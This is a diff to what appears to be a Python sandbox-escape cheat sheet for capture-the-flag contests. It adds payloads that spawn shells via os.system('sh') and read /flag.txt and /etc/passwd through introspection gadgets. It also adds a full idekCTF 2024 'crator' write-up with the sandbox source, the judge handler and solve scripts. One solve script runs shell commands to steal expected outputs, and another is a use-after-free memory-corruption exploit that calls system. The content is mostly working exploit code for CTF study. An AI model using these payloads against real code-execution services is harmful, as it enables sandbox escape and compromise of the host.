@@ -100,21 +100,25 @@ license._Printer__filenames = ['/flag.txt']; license()
 ### popular modules
 ```py
 # sys
+sys = __import__("sys")
+io = open.__self__; sys = io.__loader__.load_module("sys"))[-1]
+builtins = print.__self__; sys = builtins.__loader__.create_module([builtins.__spec__ for builtins.__spec__.name in ["sys"]][0])
+
 sys.modules["module_name"] # contains most of the builtin modules alongside frozen imports (https://docs.python.org/3/library/index.html)
+sys.modules["os"].system("sh")
 sys.breakpointhook() # same as breakpoint()
 sys._getframe().f_globals["__builtins__"].__import__("os").system("sh")
 
+# _io
+io = __import__("_io")
+io = open.__self__
+
+io.FileIO("/flag.txt").read()
+io.open("/flag.txt").read()
+io.open("/etc/passwd").buffer.raw.__class__("/flag.txt").read()
+
 # numpy
 numpy.loadtxt("/flag.txt") # stderr
-
-# pandas
-TBA
-
-# pickle
-TBA
-
-# ast
-TBA
 ```
 
 ## Bypasses and payloads
@@ -297,8 +301,12 @@ print(delete_me) # error
 ### stable payloads
 ```py
 # @salvatore-abello - type.__subclasses__(type)[0] -> <class 'abc.ABCMeta'>
-().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["breakpoint"]()
+().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["breakpoint"]() # need __import__
 ().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["__import__"]("os").system("sh")
+
+# <function __newobj__ at 0x7f0000000000> - need __import__
+[].__reduce_ex__(3)[0].__globals__["__builtins__"]["__import__"]("os").system("sh")
+[].__reduce_ex__(3)[0].__builtins__["__import__"]("os").system("sh")
 ```
 
 ### finding sinks from modules
@@ -332,6 +340,234 @@ print(delete_me) # error
         - `[].__class__.__class__("cobj", [].__class__.__bases__.__class__([[].__class__.__base__]), {})()`
 
 ## CTF
+
+### idekCTF 2024: crator
+- `sandbox.py`
+```py
+builtins_whitelist = set(
+    (
+        "RuntimeError",
+        "Exception",
+        "KeyboardInterrupt",
+        "False",
+        "None",
+        "True",
+        "bytearray",
+        "bytes",
+        "dict",
+        "float",
+        "int",
+        "list",
+        "object",
+        "set",
+        "str",
+        "tuple",
+        "abs",
+        "all",
+        "any",
+        "apply",
+        "bin",
+        "bool",
+        "buffer",
+        "callable",
+        "chr",
+        "classmethod",
+        "cmp",
+        "coerce",
+        "compile",
+        "delattr",
+        "dir",
+        "divmod",
+        "enumerate",
+        "filter",
+        "format",
+        "hasattr",
+        "hash",
+        "hex",
+        "id",
+        "input",
+        "isinstance",
+        "issubclass",
+        "iter",
+        "len",
+        "map",
+        "max",
+        "min",
+        "next",
+        "oct",
+        "open",
+        "ord",
+        "pow",
+        "print",
+        "property",
+        "range",
+        "reduce",
+        "repr",
+        "reversed",
+        "round",
+        "setattr",
+        "slice",
+        "sorted",
+        "staticmethod",
+        "sum",
+        "super",
+        "unichr",
+        "xrange",
+        "zip",
+        "len",
+        "sort",
+    )
+)
+
+class ReadOnlyBuiltins(dict):
+    def clear(self):
+        raise RuntimeError("Nein")
+    def __delitem__(self, key):
+        raise RuntimeError("Nein")
+    def pop(self, key, default=None):
+        raise RuntimeError("Nein")
+    def popitem(self):
+        raise RuntimeError("Nein")
+    def setdefault(self, key, value):
+        raise RuntimeError("Nein")
+    def __setitem__(self, key, value):
+        raise RuntimeError("Nein")
+    def update(self, dict, **kw):
+        raise RuntimeError("Nein")
+
+def _safe_open(open, submission_id):
+    def safe_open(file, mode="r"):
+        if mode != "r":
+            raise RuntimeError("Nein")
+        file = str(file)
+        if file.endswith(submission_id + ".expected"):
+            raise RuntimeError("Nein")
+        return open(file, "r")
+    return safe_open
+
+class Sandbox(object):
+    def __init__(self, submission_id):
+        import sys
+        from ctypes import pythonapi, POINTER, py_object
+
+        _get_dict = pythonapi._PyObject_GetDictPtr
+        _get_dict.restype = POINTER(py_object)
+        _get_dict.argtypes = [py_object]
+        del pythonapi, POINTER, py_object
+
+        def dictionary_of(ob):
+            dptr = _get_dict(ob)
+            return dptr.contents.value
+        type_dict = dictionary_of(type)
+        del type_dict["__bases__"]
+        del type_dict["__subclasses__"]
+        original_builtins = sys.modules["__main__"].__dict__["__builtins__"].__dict__
+        original_builtins["open"] = _safe_open(open, submission_id)
+        for builtin in list(original_builtins):
+            if builtin not in builtins_whitelist:
+                del sys.modules["__main__"].__dict__["__builtins__"].__dict__[builtin]
+        safe_builtins = ReadOnlyBuiltins(original_builtins)
+        sys.modules["__main__"].__dict__["__builtins__"] = safe_builtins
+        if hasattr(sys.modules["__main__"], "__file__"):
+            del sys.modules["__main__"].__file__
+        if hasattr(sys.modules["__main__"], "__loader__"):
+            del sys.modules["__main__"].__loader__
+        for key in [
+            "__loader__",
+            "__spec__",
+            "origin",
+            "__file__",
+            "__cached__",
+            "ReadOnlyBuiltins",
+            "Sandbox",
+        ]:
+            if key in sys.modules["__main__"].__dict__["__builtins__"]["open"].__globals__:
+                del sys.modules["__main__"].__dict__["__builtins__"]["open"].__globals__[key]
+```
+- `chall.py`
+```py
+@app.route('/submit/<problem_id>', methods=['GET', 'POST'])
+@login_required
+def submit(problem_id):
+    ...
+    code = request.form['code']
+    if len(code) > 32768:
+        return abort(400)
+    ...
+    # Prepare code
+    with open(f'/tmp/{submission_id}.py', 'w') as f:
+        f.write(f'__import__("sandbox").Sandbox("{submission_id}")\n' + code.replace('\r\n', '\n'))
+    ...
+    # Set up input and output files
+    with open(f'/tmp/{submission_id}.in', 'w') as f:
+        f.write(testcase.input.replace('\r\n', '\n'))
+    with open(f'/tmp/{submission_id}.expected', 'w') as f:
+        f.write(testcase.output.replace('\r\n', '\n'))
+
+    # Run code
+    try:
+       proc = subprocess.run(f'sudo -u nobody -g nogroup python3 /tmp/{submission_id}.py < /tmp/{submission_id}.in > /tmp/{submission_id}.out', shell=True, timeout=1)
+    if proc.returncode != 0:
+        submission.status = 'Runtime Error'
+        skip_remaining_cases = True
+        submission_case.status = 'Runtime Error'
+    else:
+        diff = subprocess.run(f'diff /tmp/{submission_id}.out /tmp/{submission_id}.expected', shell=True, capture_output=True)
+        if diff.stdout:
+            submission.status = 'Wrong Answer'
+            skip_remaining_cases = True
+            submission_case.status = 'Wrong Answer'
+        else:
+            submission_case.status = 'Accepted'
+    ...
+```
+- `solve.py`
+```py
+# @Starlight - retrieve open from closure
+open = open.__closure__[0].cell_contents
+io = open.__self__
+io.__spec__.name = 'sys'
+sys = io.__loader__.create_module(io.__spec__)
+a = input()
+if ' ' not in a:
+    sys.modules['os'].system('cat /tmp/*.expected > /tmp/flag')
+else:
+    print(a + sys.modules['os'].popen('cat /tmp/flag').read())
+
+# @realansgar - retrieve FileIO / open from io wrapper
+a = open("/etc/passwd").buffer.raw.__class__("/tmp/*.expected", "r").read()
+print(input() + sys.modules['os'].popen('cat /tmp/flag').read())
+if "idek" in a:
+    open("/etc/passwd").buffer.raw.__class__("/tmp/flag", "w").write(a)
+
+# @salvatore.abello - UAF :brain:
+def __index__(self):
+    global memory
+    uaf.clear()
+    memory = bytearray()
+    uaf.extend([0] * 56)
+    return 1
+UAF = ().__class__.__class__('UAF', (), {
+    '__index__': __index__
+})
+uaf = bytearray(56)
+uaf[23] = UAF()
+print(id(0))
+def p64(value):
+    return bytes([(value >> (i * 8)) & 0xFF for i in range(8)])
+wow = ().__class__.__class__("wow", (), {})
+print(wow)
+system_addr = id(0) - 0x653b58
+sys = p64(system_addr)
+command = b"js".ljust(8,b"\x00")
+for x in range(8):
+    memory[id(wow) + 24 + 14*8 + x] = sys[x] # Overwriting tp_repr
+fake = wow()
+for x in range(len(command)):
+     memory[id(fake) + x] = command[x] # Overwriting ob_refcnt
+input("...")
+print(fake)
+```
 
 ### UIUCTF 2024: ASTea
 - `chall.py`
